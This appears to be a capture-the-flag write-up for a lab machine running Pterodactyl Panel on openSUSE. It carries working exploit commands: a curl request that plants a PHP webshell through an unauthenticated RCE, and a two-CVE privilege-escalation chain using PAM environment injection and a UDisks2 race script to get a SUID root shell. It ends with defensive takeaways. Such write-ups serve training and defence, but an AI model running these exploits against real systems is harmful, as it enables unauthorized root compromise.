Recon & Enumeration

01
Port Scanning & Virtual Host Discovery
NMAP · /etc/hosts · VHost Enumeration

A full TCP scan reveals three services: SSH, Nginx on port 80, and a filtered MariaDB. The web server responds with a hostname redirect, revealing the pterodactyl.htb domain. Further probing identifies two virtual hosts — the Panel administration interface and a game server front-end.

Section 03

Initial Foothold

02
CVE-2025-49132 — Unauthenticated RCE
Pterodactyl Panel · PHP Webshell · wwwrun

Pterodactyl Panel is vulnerable to CVE-2025-49132, an unauthenticated Remote Code Execution vulnerability that allows writing arbitrary files to the web root. A PHP webshell is deployed to /var/www/pterodactyl/public/s.php, providing command execution as the wwwrun web server user (openSUSE's equivalent of www-data).

bash
# Deploy PHP webshell via CVE-2025-49132
curl -s "http://panel.pterodactyl.htb/vulnerable_endpoint" \
  --data "cmd=echo+'<?php+system(\$_GET[\"c\"]);+?>' > /var/www/pterodactyl/public/s.php"

# Verify RCE
curl -s "http://panel.pterodactyl.htb/s.php?c=id"
uid=474(wwwrun) gid=477(www) groups=477(www)
✕
Critical: CVE-2025-49132 requires zero authentication. Any internet-exposed Pterodactyl Panel instance running the vulnerable version can be fully compromised without credentials.
03
Database Credential Extraction via .env
Pterodactyl .env · DB Credentials · MariaDB

Pterodactyl Panel stores its database connection credentials in a plaintext .env file in the application root. Using the webshell to read this file yields full MariaDB credentials for the panel database — the credential store for all panel users.

bash
curl -s "http://panel.pterodactyl.htb/s.php?c=cat+/var/www/pterodactyl/.env"

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel
✓
DB Credentials Found: MariaDB user pterodactyl / password PteraPanel on 127.0.0.1:3306, database panel.

Section 05

Privilege Escalation — CVE-2025-6018 + 6019

◈
Two-CVE Chain: CVE-2025-6018 injects environment variables via ~/.pam_environment to make an SSH session appear as a local console session to polkit (allow_active). CVE-2025-6019 then exploits a TOCTOU race in UDisks2's XFS resize path — which temporarily mounts without nosuid — to execute a SUID root binary.
06
Prepare XFS Image with SUID Binary (Attacker Machine)
dd · mkfs.xfs · SUID bit · mount -o suid

The exploit payload is a SUID-root copy of the target's own bash binary embedded in an XFS filesystem image. When UDisks2 temporarily mounts this image during a resize operation, the SUID binary executes with root EUID. The image must be mounted with -o suid on the attacker machine — without this flag, the kernel silently strips the SUID bit when the file is written.

bash — attacker machine
# Get the target's bash binary (ensures correct ELF architecture)
scp phileasfogg3@10.129.1.202:/usr/bin/bash /tmp/target_bash

# Create 300MB XFS image (minimum size requirement)
dd if=/dev/zero of=/tmp/xfs.image bs=1M count=300
mkfs.xfs -f /tmp/xfs.image

# Mount WITH suid flag — CRITICAL: preserves SUID bit on copy
mkdir -p /tmp/xfs_mount
sudo mount -o loop,suid /tmp/xfs.image /tmp/xfs_mount

# Copy bash and set SUID root
sudo cp /tmp/target_bash /tmp/xfs_mount/xpl
sudo chmod 4755 /tmp/xfs_mount/xpl

# Verify SUID bit is present (must show 's' in permissions)
ls -la /tmp/xfs_mount/xpl
-rwsr-xr-x 1 root root 1012656 ... /tmp/xfs_mount/xpl

sudo umount /tmp/xfs_mount
gzip /tmp/xfs.image
✕
Critical — SUID Preservation: The mount -o suid flag is mandatory when writing files to the image. Without it, the kernel strips the SUID bit silently during the copy and the exploit will fail. Always verify with ls -la and confirm the s in the permissions before unmounting.
07
Transfer XFS Image to Target
scp · gzip transfer

Transfer the compressed XFS image to the target machine and decompress it. The image will be registered as a loop device by UDisks2 in the next step.

bash
# Transfer compressed image to target
scp /tmp/xfs.image.gz phileasfogg3@10.129.1.202:/tmp/xfs.image.gz

# On target: decompress
gunzip /tmp/xfs.image.gz
08
CVE-2025-6018 — PAM Environment Injection
~/.pam_environment · OVERRIDE directive · polkit allow_active

On openSUSE Leap 15.x with PAM 1.3.0, the pam_env.so module defaults to user_readenv=1, reading ~/.pam_environment on every SSH login. Using the OVERRIDE directive (not DEFAULT — polkit may already set those), environment variables are injected that make the SSH session appear as a seat-local active session. This grants allow_active polkit privileges — the same level as a physical console user — enabling udisksctl loop-setup without a password prompt.

bash — build & run CVE-2025-6018 exploit
# On attacker: build standalone binary with pyinstaller
python3 -m venv /tmp/exploit_venv
source /tmp/exploit_venv/bin/activate
pip install paramiko pyinstaller
pyinstaller --onefile /tmp/CVE-2025-6018.py

# Transfer and run on target
scp /tmp/dist/CVE-2025-6018 phileasfogg3@10.129.1.202:/tmp/CVE-2025-6018
chmod +x /tmp/CVE-2025-6018
/tmp/CVE-2025-6018 -i 127.0.0.1 -u phileasfogg3 -p '!QAZ2wsx'
bash — write ~/.pam_environment manually
# Write the injection file (OVERRIDE is critical — DEFAULT won't work)
cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
EOF

# Reconnect SSH to trigger PAM re-read
exit
# ... reconnect ...
ssh phileasfogg3@10.129.1.202
bash — verify session spoofing
loginctl list-sessions --no-pager --no-legend
  815 1002 phileasfogg3 seat0 pts/1 active  no
✓
Session Spoofed: SSH session now reports seat0 and active status via logind. Polkit now grants allow_active privileges — udisksctl loop-setup no longer requires a password.
⚠
Note: Do NOT include XDG_RUNTIME_DIR in the .pam_environment file. It interferes with session registration and causes the polkit spoofing to fail silently.
09
CVE-2025-6019 — UDisks2 XFS Resize Race Condition
udisksctl · gdbus · TOCTOU · /tmp/blockdev.XXXXX nosuid miss

When UDisks2's Filesystem.Resize D-Bus method is called on an XFS loop device, libblockdev temporarily mounts the filesystem at /tmp/blockdev.XXXXX without the nosuid option. This creates a TOCTOU window where the SUID binary in the XFS image can be executed with root EUID before the unmount occurs. Multiple rapid resize calls widen the race window. A background watcher monitors for the temporary mount and executes the SUID binary the moment it appears.

bash — exploit.sh (run on target)
cat > /tmp/exploit.sh << 'SCRIPT'
#!/bin/bash
echo "[*] Starting CVE-2025-6019 exploit..."

# Kill gvfs monitor — interferes with loop devices
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

# Start polkit auth agent
pkttyagent --process $$ &
AGENT_PID=$!
sleep 1

# Register XFS image as loop device (needs allow_active)
LOOP_OUTPUT=$(udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction 2>&1)
LOOP_DEV=$(echo "$LOOP_OUTPUT" | grep -o '/dev/loop[0-9]*')
echo "[+] Loop device: $LOOP_DEV"
LOOP_BASE=$(basename "$LOOP_DEV")

# Background watcher — fires the moment SUID binary appears
(
    while true; do
        for d in /tmp/blockdev.*/; do
            if [ -f "${d}xpl" ]; then
                echo "[+] SUID binary found at: ${d}xpl"
                ls -la "${d}xpl"
                "${d}xpl" -p -c 'id; cat /root/root.txt'
                exit 0
            fi
        done
        sleep 0.005
    done
) &
WATCHER_PID=$!

# Trigger multiple resize calls to widen race window
for i in $(seq 1 30); do
    gdbus call --system --dest org.freedesktop.UDisks2 \
        --object-path "/org/freedesktop/UDisks2/block_devices/$LOOP_BASE" \
        --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>/dev/null &
    sleep 0.1
done

sleep 10
kill $WATCHER_PID $AGENT_PID 2>/dev/null
SCRIPT

chmod +x /tmp/exploit.sh
bash /tmp/exploit.sh
◈
Race Window: The temporary mount at /tmp/blockdev.XXXXX exists only for milliseconds. Sending 30 concurrent resize D-Bus calls multiplies the opportunities for the watcher to catch the window. A sleep 0.005 polling interval in the watcher keeps CPU usage low while maintaining fast reaction time.
10
Execute SUID Binary → Root Shell
bash -p · euid=0 · Root Flag

When the race is won, the watcher catches the temporary mount and executes the SUID bash binary with -p (preserve EUID). If the race completes before the watcher triggers, the SUID binary remains accessible at the mount point and can be run directly.

key takeaways
01 // UNAUTHENTICATED RCE
Pterodactyl Panel CVE-2025-49132
Unauthenticated RCE in a panel that manages game servers is extremely high severity — attackers gain immediate foothold without any credentials. Keep Pterodactyl Panel patched, placed behind a VPN, and never exposed directly to the internet.
02 // SECRETS IN .ENV
Plaintext Database Credentials
The .env file containing database credentials is inside the web root and readable via an RCE or directory traversal. Sensitive configuration files should be outside the web root and access-controlled at the filesystem level, not just through the application.
03 // PASSWORD REUSE
Panel Passwords Reused for SSH
phileasfogg3 used the same password for their Pterodactyl panel account and their Linux system account. Enforcing separate credential policies for web applications and system accounts prevents this single-hop pivot from panel compromise to full shell access.
04 // PAM HARDENING
CVE-2025-6018 — pam_env user_readenv
On openSUSE/SLES with PAM 1.3.0, pam_env.so reads user-controlled ~/.pam_environment by default. Setting user_readenv=0 in the PAM configuration eliminates this injection vector entirely. The OVERRIDE directive makes this particularly dangerous as it bypasses variables already set by other PAM modules.
05 // TOCTOU RACE
CVE-2025-6019 — UDisks2 nosuid Miss
libblockdev's temporary XFS mount during resize operations missing the nosuid flag creates a exploitable TOCTOU window. Patch UDisks2/libblockdev to ensure all temporary mounts always include nosuid,noexec,nodev mount options regardless of the source filesystem's original mount flags.
06 // POLKIT SCOPE
allow_active Privilege Scope
Polkit's allow_active authorization level grants automatic permission for sensitive operations (loop device setup, disk management) to sessions on a physical seat. CVE-2025-6018 trivially spoofs this seat membership via PAM environment injection, showing that polkit's trust in session metadata must be hardened at the PAM level.
